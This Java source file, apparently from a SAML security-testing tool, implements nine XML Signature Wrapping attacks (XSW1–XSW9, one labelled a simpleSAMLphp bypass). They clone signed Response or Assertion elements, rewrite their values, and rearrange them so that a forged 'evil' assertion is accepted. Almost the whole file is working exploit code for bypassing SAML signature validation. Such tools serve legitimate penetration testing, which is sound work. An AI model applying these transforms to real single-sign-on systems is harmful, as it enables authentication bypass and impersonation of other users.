package helpers;

import helpers.diff_match_patch.Diff;
import helpers.diff_match_patch.LinesToCharsResult;

import java.util.HashMap;
import java.util.LinkedList;

import org.w3c.dom.Document;
import org.w3c.dom.Element;
import org.w3c.dom.Node;

public class XSWHelpers {

	public final static String[] xswTypes = { "XSW1", "XSW2", "XSW3", "XSW4", "XSW5", "XSW6", "XSW7", "XSW8", "XSW9"};

	public static final HashMap<String, String> MATCH_AND_REPLACE_MAP = new HashMap<>();

	/*
	 * Following are the 8 common XML Signature Wrapping attacks implemented, which
	 * were found in a paper called "On Breaking SAML: Be Whoever You Want to Be" We
	 * have also documented these attacks in our product documentation for further
	 * information
	 * 
	 */

	public void applyXSW(String xswType, Document document) {
		switch (xswType) {
		case "XSW1":
			applyXSW1(document);
			break;
		case "XSW2":
			applyXSW2(document);
			break;
		case "XSW3":
			applyXSW3(document);
			break;
		case "XSW4":
			applyXSW4(document);
			break;
		case "XSW5":
			applyXSW5(document);
			break;
		case "XSW6":
			applyXSW6(document);
			break;
		case "XSW7":
			applyXSW7(document);
			break;
		case "XSW8":
			applyXSW8(document);
			break;
		case "XSW9":
			applyXSW9(document);
			break;
		}
	}

	// Fixed - clonedSignature was not found in clonedResponse
	public void applyXSW1(Document document) {
		Element response = (Element) document.getElementsByTagNameNS("*", "Response").item(0);
		Element clonedResponse = (Element) response.cloneNode(true);
		// The Original response will be the evil one
		applyMatchAndReplaceValues(response);
		Element clonedSignature = (Element) clonedResponse.getElementsByTagNameNS("*", "Signature").item(0);
		clonedSignature.getParentNode().removeChild(clonedSignature);
		Element signature = (Element) response.getElementsByTagNameNS("*", "Signature").item(0);
		signature.appendChild(clonedResponse);
		response.setAttribute("ID", "_evil_response_ID");
	}

	// Fixed - clonedSignature was not found in clonedResponse
	public void applyXSW2(Document document) {
		Element response = (Element) document.getElementsByTagNameNS("*", "Response").item(0);
		Element clonedResponse = (Element) response.cloneNode(true);
		// The Original response will be the evil one
		applyMatchAndReplaceValues(response);
		Element clonedSignature = (Element) clonedResponse.getElementsByTagNameNS("*", "Signature").item(0);
		clonedSignature.getParentNode().removeChild(clonedSignature);
		Element signature = (Element) response.getElementsByTagNameNS("*", "Signature").item(0);
		signature.getParentNode().insertBefore(clonedResponse, signature);
		response.setAttribute("ID", "_evil_response_ID");
	}

	public void applyXSW3(Document document) {
		Element assertion = (Element) document.getElementsByTagNameNS("*", "Assertion").item(0);
		Element evilAssertion = (Element) assertion.cloneNode(true);
		applyMatchAndReplaceValues(evilAssertion);
		Element copiedSignature = (Element) evilAssertion.getElementsByTagNameNS("*", "Signature").item(0);
		evilAssertion.setAttribute("ID", "_evil_assertion_ID");
		evilAssertion.removeChild(copiedSignature);
		document.getDocumentElement().insertBefore(evilAssertion, assertion);
	}

	public void applyXSW4(Document document) {
		Element assertion = (Element) document.getElementsByTagNameNS("*", "Assertion").item(0);
		Element evilAssertion = (Element) assertion.cloneNode(true);
		applyMatchAndReplaceValues(evilAssertion);
		Element copiedSignature = (Element) evilAssertion.getElementsByTagNameNS("*", "Signature").item(0);
		evilAssertion.setAttribute("ID", "_evil_assertion_ID");
		evilAssertion.removeChild(copiedSignature);
		document.getDocumentElement().appendChild(evilAssertion);
		evilAssertion.appendChild(assertion);
	}

	public void applyXSW5(Document document) {
		Element evilAssertion = (Element) document.getElementsByTagNameNS("*", "Assertion").item(0);
		Element assertion = (Element) evilAssertion.cloneNode(true);
		applyMatchAndReplaceValues(evilAssertion);
		Element copiedSignature = (Element) assertion.getElementsByTagNameNS("*", "Signature").item(0);
		assertion.removeChild(copiedSignature);
		document.getDocumentElement().appendChild(assertion);
		evilAssertion.setAttribute("ID", "_evil_assertion_ID");
	}

	public void applyXSW6(Document document) {
		Element evilAssertion = (Element) document.getElementsByTagNameNS("*", "Assertion").item(0);
		Element originalSignature = (Element) evilAssertion.getElementsByTagNameNS("*", "Signature").item(0);
		Element assertion = (Element) evilAssertion.cloneNode(true);
		applyMatchAndReplaceValues(evilAssertion);
		Element copiedSignature = (Element) assertion.getElementsByTagNameNS("*", "Signature").item(0);
		assertion.removeChild(copiedSignature);
		originalSignature.appendChild(assertion);
		evilAssertion.setAttribute("ID", "_evil_assertion_ID");
	}

	public void applyXSW7(Document document) {
		Element assertion = (Element) document.getElementsByTagNameNS("*", "Assertion").item(0);
		Element extensions = document.createElement("Extensions");
		document.getDocumentElement().insertBefore(extensions, assertion);
		Element evilAssertion = (Element) assertion.cloneNode(true);
		applyMatchAndReplaceValues(evilAssertion);
		Element copiedSignature = (Element) evilAssertion.getElementsByTagNameNS("*", "Signature").item(0);
		evilAssertion.removeChild(copiedSignature);
		extensions.appendChild(evilAssertion);
	}

	public void applyXSW8(Document document) {
		Element evilAssertion = (Element) document.getElementsByTagNameNS("*", "Assertion").item(0);
		Element originalSignature = (Element) evilAssertion.getElementsByTagNameNS("*", "Signature").item(0);
		Element assertion = (Element) evilAssertion.cloneNode(true);
		applyMatchAndReplaceValues(evilAssertion);
		Element copiedSignature = (Element) assertion.getElementsByTagNameNS("*", "Signature").item(0);
		assertion.removeChild(copiedSignature);
		Element object = document.createElement("Object");
		originalSignature.appendChild(object);
		object.appendChild(assertion);
	}

	// simpleSAMLphpBypass
	public void applyXSW9(Document document) {
		Element evilAssertion = (Element) document.getElementsByTagNameNS("*", "Assertion").item(0);
		Element assertion = (Element) evilAssertion.cloneNode(true);
		Element signatureToRemove = (Element) assertion.getElementsByTagNameNS("*", "Signature").item(0);
		assertion.removeChild(signatureToRemove);
		Element wrapper = document.createElement("Wrapper");
		evilAssertion.getParentNode().appendChild(wrapper);
		wrapper.appendChild(assertion);
		evilAssertion.setAttribute("ID", "_evil_assertion_ID");
		Element signatureToModify = (Element) evilAssertion.getElementsByTagNameNS("*", "Signature").item(0);
		Element signedInfo = (Element) signatureToModify.getElementsByTagNameNS("*", "SignedInfo").item(0);
		Element evilSignedInfo = (Element) signedInfo.cloneNode(true);
		Element evilReference = (Element) evilSignedInfo.getElementsByTagNameNS("*", "Reference").item(0);
		signatureToModify.appendChild(evilSignedInfo);
		evilReference.setAttribute("URI", "#_evil_assertion_ID");
		applyMatchAndReplaceValues(evilAssertion);
	}
	
	public String diffLineMode(String text1, String text2) {
		diff_match_patch differ = new diff_match_patch();
		differ.Diff_Timeout = 5;
		LinesToCharsResult result = differ.diff_linesToChars(text1, text2);

		LinkedList<Diff> diffs = differ.diff_main(result.chars1, result.chars2, false);
		differ.diff_charsToLines(diffs, result.lineArray);
		return differ.diff_prettyHtml(diffs);
	}

	public void applyMatchAndReplaceValues(Node elem) {
		for (int i = 0; i < elem.getChildNodes().getLength(); i++) {
			Node currentNode = elem.getChildNodes().item(i);
			if (currentNode.getNodeType() == Node.ELEMENT_NODE) {
				applyMatchAndReplaceValues(currentNode);
			} else {
				if (!currentNode.getNodeValue().trim().equals("")) {
					for (String matchString : MATCH_AND_REPLACE_MAP.keySet()) {
						if (currentNode.getNodeValue().equals(matchString)) {
							currentNode.setNodeValue(MATCH_AND_REPLACE_MAP.get(matchString));
						}
					}
				}
			}
		}
	}
}